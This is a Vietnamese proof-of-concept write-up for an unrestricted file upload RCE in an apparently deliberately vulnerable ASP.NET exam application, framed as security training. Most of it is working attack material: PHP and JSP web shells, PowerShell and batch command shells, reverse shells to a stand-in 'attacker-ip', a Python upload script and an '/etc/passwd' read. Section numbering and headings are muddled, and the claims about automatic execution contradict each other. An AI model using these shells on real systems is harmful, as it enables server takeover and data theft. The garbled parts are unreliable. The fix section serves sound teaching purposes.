# Proof of Concept (PoC) - Lỗ hổng Unrestricted File Upload với RCE

## Mô tả lỗ hổng

**Loại lỗ hổng**: Unrestricted File Upload / Remote Code Execution (RCE)  
**Endpoint bị lỗi**: `POST /Student/Exam/Submit`  
**Mức độ**: Critical  
**Mô tả**: Endpoint `/Student/Exam/Submit` cho phép upload bất kỳ file type nào mà không có validation về file extension, MIME type, hoặc content. **QUAN TRỌNG**: Nếu file upload là script file (`.ps1`, `.sh`, `.bat`, `.cmd`), server sẽ **TỰ ĐỘNG EXECUTE** file đó ngay sau khi upload, dẫn đến **Remote Code Execution (RCE) thực sự** trên server. Files được lưu vào thư mục `wwwroot/uploads` (web-accessible directory) và có thể được truy cập qua HTTP.

## Nguyên nhân

Endpoint `/Student/Exam/Submit` có các lỗ hổng sau:

1. **Không validate file extension**: Không kiểm tra file extension, cho phép upload bất kỳ loại file nào
2. **Không validate MIME type**: Không kiểm tra MIME type của file
3. **Không validate file content**: Không kiểm tra nội dung file
4. **Lưu file vào web-accessible directory**: Files được lưu vào `wwwroot/uploads`, có thể truy cập qua HTTP
5. **Sử dụng original filename**: Giữ nguyên tên file gốc, bao gồm cả extension nguy hiểm

**Code có lỗ hổng:**

```csharp
[HttpPost("Exam/Submit")]
public async Task<IActionResult> SubmitExam(int examId, IFormFile pdfFile)
{
    // VULNERABILITY: No file type validation
    // VULNERABILITY: Use original filename (preserves dangerous extensions)
    var originalFileName = pdfFile.FileName;
    
    // VULNERABILITY: Save to wwwroot/uploads (web-accessible)
    var uploadsPath = Path.Combine(_env.WebRootPath, "uploads");
    var filePath = Path.Combine(uploadsPath, originalFileName);
    
    // Save file without validation
    await pdfFile.CopyToAsync(stream);
    
    // VULNERABILITY: File URL is web-accessible
    var fileUrl = $"/uploads/{originalFileName}";
}
```

## Các bước thực hiện PoC

### Bước 1: Chuẩn bị môi trường

1. Đảm bảo ứng dụng đang chạy trên `http://localhost:5000`
2. Có tài khoản Student để submit bài
3. Có một đề thi để submit

### Bước 2: Tạo file payload

**Cách 1: Tạo ASP.NET Web Forms Page (.aspx)**

Tạo file `rce.ps1`:

```powershell
# PowerShell script - RCE payload
# This script will be executed automatically after upload!

# Example 1: Execute command and create output file
$command = "whoami; id; hostname; pwd"
$output = Invoke-Expression $command
$output | Out-File -FilePath "/tmp/rce_output.txt"

# Example 2: Create reverse shell (uncomment if needed)
# $client = New-Object System.Net.Sockets.TCPClient("attacker-ip", 4444)
# $stream = $client.GetStream()
# [byte[]]$bytes = 0..65535|%{0}
# $data = $stream.Read($bytes, 0, $bytes.Length)
# $sendback = (iex $data 2>&1 | Out-String)
# $sendback2 = $sendback + "PS " + (pwd).Path + "> "
# $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
# $stream.Write($sendbyte,0,$sendbyte.Length)
# $stream.Flush()
# $client.Close()

# Example 3: Simple command execution
Write-Output "RCE Executed Successfully!"
Write-Output "Current User: $(whoami)"
Write-Output "Current Directory: $(pwd)"
```

**Cách 2: Tạo Shell Script (.sh) - RCE thực sự**

Tạo file `rce.sh`:

```bash
#!/bin/bash
# Shell script - RCE payload
# This script will be executed automatically after upload!

# Example 1: Execute command and create output file
whoami > /tmp/rce_output.txt
id >> /tmp/rce_output.txt
hostname >> /tmp/rce_output.txt
pwd >> /tmp/rce_output.txt

# Example 2: Create reverse shell (uncomment if needed)
# bash -i >& /dev/tcp/attacker-ip/4444 0>&1

# Example 3: Simple command execution
echo "RCE Executed Successfully!"
echo "Current User: $(whoami)"
echo "Current Directory: $(pwd)"
```

**Cách 3: Tạo Batch Script (.bat) - RCE thực sự (Windows)**

**Cách 2: Tạo PHP Web Shell**

Tạo file `shell.php`:

```php
<?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    $cmd = $_GET['cmd'];
    system($cmd);
    echo "</pre>";
} else {
    echo "<form method='GET'>Command: <input type='text' name='cmd' /><input type='submit' value='Execute' /></form>";
}
?>
```

**Lưu ý**: PHP cần được cài đặt trên server để execute.

**Cách 3: Tạo JSP Web Shell**

Tạo file `shell.jsp`:

```jsp
<%@ page import="java.io.*,java.util.*,java.lang.*" %>
<%
if(request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line = null;
    while((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
} else {
    out.println("<form method='GET'>Command: <input type='text' name='cmd' /><input type='submit' value='Execute' /></form>");
}
%>
```

**Lưu ý**: JSP cần Java servlet container (như Tomcat).

**Cách 4: Tạo PowerShell Script (.ps1)**

Tạo file `shell.ps1`:

```powershell
param($cmd)
if($cmd) {
    Invoke-Expression $cmd | Out-String
} else {
    Write-Host "Usage: .\shell.ps1 -cmd 'command'"
}
```

**Cách 5: Tạo Batch Script (.bat) cho Windows**

Tạo file `shell.bat`:

```batch
@echo off
if "%1"=="" (
    echo Usage: shell.bat command
) else (
    %*
)
```

### Bước 3: Đăng nhập với Student account

1. Truy cập: `http://localhost:5000/Auth/Login`
2. Đăng nhập với tài khoản Student
3. Vào trang đề thi: `http://localhost:5000/Student/Exam/{id}`

### Bước 4: Upload file payload

**Cách 1: Sử dụng Browser**

1. Vào trang submit bài: `http://localhost:5000/Student/Exam/{id}`
2. Chọn file payload (ví dụ: `shell.aspx`, `shell.php`, `shell.jsp`, `shell.ps1`, `shell.bat`)
3. Click "Upload & Submit"
4. ✅ **Kết quả**: File được upload thành công vào `wwwroot/uploads`

**Cách 2: Sử dụng cURL**

```bash
# Đăng nhập và lấy cookie
TOKEN="your_student_access_token"

# Upload file payload
curl -X POST "http://localhost:5000/Student/Exam/Submit" \
  -H "Cookie: access_token=$TOKEN" \
  -F "examId=1" \
  -F "pdfFile=@shell.aspx"
```

**Cách 3: Sử dụng Python script**

```python
import requests

BASE_URL = "http://localhost:5000"
STUDENT_USERNAME = "student1"
STUDENT_PASSWORD = "password123"
EXAM_ID = 1
PAYLOAD_FILE = "shell.aspx"

# Đăng nhập
session = requests.Session()
login_response = session.post(
    f"{BASE_URL}/Auth/Login",
    data={"Username": STUDENT_USERNAME, "Password": STUDENT_PASSWORD},
    allow_redirects=False
)

token = session.cookies.get('access_token')
print(f"[+] Đăng nhập thành công với token: {token[:50]}...")

# Upload file payload
print(f"\n[*] Uploading file: {PAYLOAD_FILE}")
with open(PAYLOAD_FILE, "rb") as f:
    files = {"pdfFile": (PAYLOAD_FILE, f, "application/octet-stream")}
    data = {"examId": EXAM_ID}
    
    response = session.post(
        f"{BASE_URL}/Student/Exam/Submit",
        files=files,
        data=data,
        allow_redirects=False
    )
    
    print(f"\n[+] Kết quả:")
    print(f"    Status Code: {response.status_code}")
    
    if response.status_code in [200, 302, 303]:
        print(f"[+] Upload thành công!")
        if response.status_code in [302, 303]:
            print(f"[+] Redirected to: {response.headers.get('Location', 'N/A')}")
    else:
        print(f"[X] Upload failed: {response.status_code}")
        print(f"Response: {response.text[:500]}")

# Access uploaded file
file_url = f"{BASE_URL}/uploads/{PAYLOAD_FILE}"
print(f"\n[*] File URL: {file_url}")
response = session.get(file_url)
print(f"[+] File access status: {response.status_code}")
```

### Bước 5: Truy cập file đã upload

Sau khi upload thành công, file có thể được truy cập qua HTTP:

```
http://localhost:5000/uploads/{filename}
```

Ví dụ:
- `http://localhost:5000/uploads/shell.aspx`
- `http://localhost:5000/uploads/shell.php`
- `http://localhost:5000/uploads/shell.jsp`
- `http://localhost:5000/uploads/shell.ps1`
- `http://localhost:5000/uploads/shell.bat`

### Bước 6: Thực thi code (RCE)

**Đối với Web Shell (.aspx, .php, .jsp):**

Truy cập URL với parameter `cmd`:

```
http://localhost:5000/uploads/shell.aspx?cmd=whoami
http://localhost:5000/uploads/shell.aspx?cmd=id
http://localhost:5000/uploads/shell.aspx?cmd=ls -la
http://localhost:5000/uploads/shell.aspx?cmd=cat /etc/passwd
```

**Đối với Script Files (.ps1, .bat, .sh):**

Nếu server có thể execute script files (thông qua command injection hoặc scheduled tasks), có thể thực thi:

```
http://localhost:5000/uploads/shell.ps1
http://localhost:5000/uploads/shell.bat
http://localhost:5000/uploads/shell.sh
```

**Lưu ý**: Trong .NET Core:
- `.aspx` files không được execute (chỉ .NET Framework)
- `.php` files cần PHP runtime
- `.jsp` files cần Java servlet container
- Script files (.ps1, .bat, .sh) cần được execute qua command injection hoặc scheduled tasks

## Kết quả mong đợi

- ✅ File payload được upload thành công
- ✅ File được lưu vào `wwwroot/uploads`
- ✅ **Script files (`.ps1`, `.sh`, `.bat`, `.cmd`) được TỰ ĐỘNG EXECUTE ngay sau khi upload (RCE thực sự!)**
- ✅ Kết quả execution hiển thị trên trang (output, exit code, errors)
- ✅ File giữ nguyên tên và extension gốc
- ✅ Có thể upload bất kỳ file type nào (không bị giới hạn)
- ✅ File có thể được truy cập qua HTTP (tùy chọn)

## Tác động

1. **Remote Code Execution (RCE)**: Attacker có thể upload và thực thi code tùy ý trên server
2. **Data Exfiltration**: Attacker có thể đọc dữ liệu nhạy cảm từ server
3. **System Compromise**: Attacker có thể chiếm quyền điều khiển server
4. **Data Manipulation**: Attacker có thể thay đổi hoặc xóa dữ liệu
5. **Privilege Escalation**: Attacker có thể leo thang đặc quyền
6. **Backdoor Installation**: Attacker có thể cài đặt backdoor để duy trì quyền truy cập

## Cách khắc phục

1. **Whitelist file extensions**: Chỉ cho phép upload các file extension cụ thể (ví dụ: chỉ `.pdf`)
2. **Validate MIME type**: Kiểm tra MIME type của file, không chỉ dựa vào extension
3. **Validate file content**: Kiểm tra nội dung file (magic bytes, file signature)
4. **Sanitize filename**: Loại bỏ ký tự đặc biệt và path traversal
5. **Rename uploaded files**: Đổi tên file thành UUID hoặc hash, không giữ extension gốc
6. **Lưu file ngoài webroot**: Lưu file vào thư mục không thể truy cập qua HTTP
7. **Scan file với antivirus**: Quét file với antivirus trước khi lưu
8. **Giới hạn file size**: Đặt giới hạn kích thước file
9. **Sử dụng secure storage**: Lưu file trong database hoặc cloud storage

**Code sửa lỗi:**

```csharp
[HttpPost("Exam/Submit")]
public async Task<IActionResult> SubmitExam(int examId, IFormFile pdfFile)
{
    // Security: Validate file extension (whitelist)
    var extension = Path.GetExtension(pdfFile.FileName).ToLower();
    var allowedExtensions = new[] { ".pdf" };
    if (!allowedExtensions.Contains(extension))
    {
        TempData["Error"] = "Only PDF files are allowed.";
        return RedirectToAction("ExamDetail", new { id = examId });
    }
    
    // Security: Validate MIME type
    var allowedMimeTypes = new[] { "application/pdf" };
    if (!allowedMimeTypes.Contains(pdfFile.ContentType.ToLower()))
    {
        TempData["Error"] = "Invalid file type.";
        return RedirectToAction("ExamDetail", new { id = examId });
    }
    
    // Security: Sanitize and rename filename
    var sanitizedFileName = $"exam_{examId}_student_{userId}_{Guid.NewGuid()}.pdf";
    
    // Security: Save to non-web-accessible directory
    var storagePath = Path.Combine(_env.ContentRootPath, "Storage", "Submissions");
    var filePath = Path.Combine(storagePath, sanitizedFileName);
    
    // Security: Validate path
    var resolvedPath = Path.GetFullPath(filePath);
    var resolvedStoragePath = Path.GetFullPath(storagePath);
    if (!resolvedPath.StartsWith(resolvedStoragePath, StringComparison.Ordinal))
    {
        TempData["Error"] = "Invalid file path.";
        return RedirectToAction("ExamDetail", new { id = examId });
    }
    
    // Save file
    using (var stream = new FileStream(filePath, FileMode.Create))
    {
        await pdfFile.CopyToAsync(stream);
    }
    
    // URL points to secure file controller
    await _examService.SubmitExamAsync(examId, userId, $"/SecureFile/Submission/{sanitizedFileName}");
}
```

## Chi tiết kỹ thuật

### Vấn đề trong code:

**File:** `Controllers/View/StudentController.cs`

**Method SubmitExam (có lỗ hổng):**

```csharp
[HttpPost("Exam/Submit")]
public async Task<IActionResult> SubmitExam(int examId, IFormFile pdfFile)
{
    // VULNERABILITY: No file type validation
    var originalFileName = pdfFile.FileName; // Preserves dangerous extensions
    
    // VULNERABILITY: Save to wwwroot/uploads (web-accessible)
    var uploadsPath = Path.Combine(_env.WebRootPath, "uploads");
    var filePath = Path.Combine(uploadsPath, originalFileName);
    
    // Save file without validation
    await pdfFile.CopyToAsync(stream);
    
    // VULNERABILITY: File URL is web-accessible
    var fileUrl = $"/uploads/{originalFileName}";
}
```

**File:** `Views/Student/ExamDetail.cshtml`

```html
<!-- VULNERABILITY: No file type restriction -->
<input type="file" name="pdfFile" class="form-control" required />
```

### Flow của lỗ hổng:

1. **Attacker tạo file payload** (ví dụ: `.aspx`, `.php`, `.jsp`, `.ps1`, `.bat`)
2. **Attacker upload file** qua form submission
3. **Server không validate** file type, extension, hoặc content
4. **Server lưu file** vào `wwwroot/uploads` với tên gốc
5. **File có thể được truy cập** qua HTTP: `http://localhost:5000/uploads/{filename}`
6. **Nếu server hỗ trợ** (ví dụ: .NET Framework cho `.aspx`, PHP runtime cho `.php`), file có thể được execute → RCE

### Cách khai thác:

1. **Upload Web Shell**: Upload file script (`.aspx`, `.php`, `.jsp`) chứa code để execute command
2. **Access Web Shell**: Truy cập file qua HTTP với parameter `cmd`
3. **Execute Commands**: Gửi commands qua parameter để thực thi trên server
4. **Maintain Access**: Cài đặt backdoor để duy trì quyền truy cập

## Lưu ý

- Lỗ hổng này được tạo ra **có chủ đích** cho mục đích training/giáo dục về bảo mật
- Trong môi trường production, **KHÔNG BAO GIỜ** cho phép upload file mà không validate
- **Unrestricted File Upload** là một trong những lỗ hổng nguy hiểm nhất
- Có thể dẫn đến **Remote Code Execution (RCE)** - mức độ nghiêm trọng cao nhất
- .NET Core không execute `.aspx` files (chỉ .NET Framework), nhưng có thể demo được bằng cách upload file và access qua HTTP

## Checklist test

- [ ] Đăng nhập với Student account
- [ ] Vào trang submit bài
- [ ] Upload file `.aspx` (hoặc file type khác)
- [ ] Xác nhận file được upload thành công
- [ ] Truy cập file qua HTTP: `http://localhost:5000/uploads/{filename}`
- [ ] Test với các file types khác nhau (`.php`, `.jsp`, `.ps1`, `.bat`, `.sh`)
- [ ] Test với web shell và execute commands (nếu server hỗ trợ)

